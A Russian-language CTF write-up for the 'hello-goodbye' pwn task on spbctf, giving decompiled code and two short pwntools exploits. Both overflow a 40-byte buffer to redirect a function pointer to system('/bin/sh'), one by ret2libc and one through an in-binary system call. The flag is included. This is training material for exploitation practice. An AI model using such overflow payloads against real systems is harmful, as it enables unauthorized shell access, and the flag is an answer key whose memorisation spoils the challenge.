[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_hello_goodbye)
Описание:
Привет или пока. Выбирать только тебе.
`nc 109.233.56.90 11670`
**[hello-goodbye.elf](https://pwn.spbctf.ru/files/aslr/hello_goodbye/hello-goodbye.elf)**  
**[libc-2.31.so](https://pwn.spbctf.ru/files/aslr/hello_goodbye/libc-2.31.so)**

# Решение через ret2libc
Т.к. к задаче прикреплена libc, то при помощи IDA можно найти в ней адрес функции system.
![{9F7E4F08-6215-44C0-B568-E2E17196AB76}](../../../../z.%20Images/{9F7E4F08-6215-44C0-B568-E2E17196AB76}.png)

Эксплоит:
``` python
libc_base = 0x7ffff7de3000
system_addr = 0x48F20

io = start()

io.sendline(b'1')
payload = b'bin/sh\x00'.ljust(40, b'A') + p64(libc_base + system_addr)
io.sendline(payload)

io.interactive()
```

Запуск:
![{6B21A9E0-50EA-492B-B6A0-E95157468B46}](../../../../z.%20Images/{6B21A9E0-50EA-492B-B6A0-E95157468B46}.png)

# Альтернативное решение
Внутри программы имеется функция system.
``` C
int show_memory()
{
  puts("========================================== MEMORY SEGMENTS ==========================================");
  system("cat /proc/$PPID/maps");
  return puts(
    "====================================================================================================\n\n");
}
```
![{EEAF55E0-9760-4AE8-8B29-7272236BC776}](../../../../z.%20Images/{EEAF55E0-9760-4AE8-8B29-7272236BC776}.png)

Внутри основной программы есть вызов функции `(v6)(buf)`, т.к. первый параметр передаётся через регистр `rdi`, можно записать в `buf` значение `bin/sh\x00`, и при помощи переполнения буфера переписать адрес функции v6 на часть кода с `call _system`.
``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int userChoise; // [rsp+Ch] [rbp-34h] BYREF
  _BYTE buf[40]; // [rsp+10h] [rbp-30h] BYREF
  __int64 (__fastcall *v6)(); // [rsp+38h] [rbp-8h]

  show_memory();

  printf("Choose action:\n[1] hello\n[2] goodbye\n> ");
  if ( __isoc99_scanf("%d", &userChoise) != 1 )
    exit(1);

  if ( userChoise == 1 )
  {
    v6 = hello;
  }
  else
  {
    if ( userChoise != 2 )
    {
      puts("Incorrect input, exiting...");
      exit(1);
    }
    v6 = goodbye;
  }
  printf("Enter your name: ");
  if ( read(0, buf, 0x80u) <= 0 )
    exit(1);
  (v6)(buf);
  return 0;
}
```

Эксплоит:
``` python
system_call = 0x401199

io = start()

io.sendline(b'1')
payload = b"/bin/sh\x00".ljust(40, b"A") + p64(system_call)
io.sendline(payload)

io.interactive()
```

Запуск:
![Pasted image 20260320123732](../../../../z.%20Images/Pasted%20image%2020260320123732.png)

Ответ: `spbctf{h3ll0_600dby3_0r_5y573m}`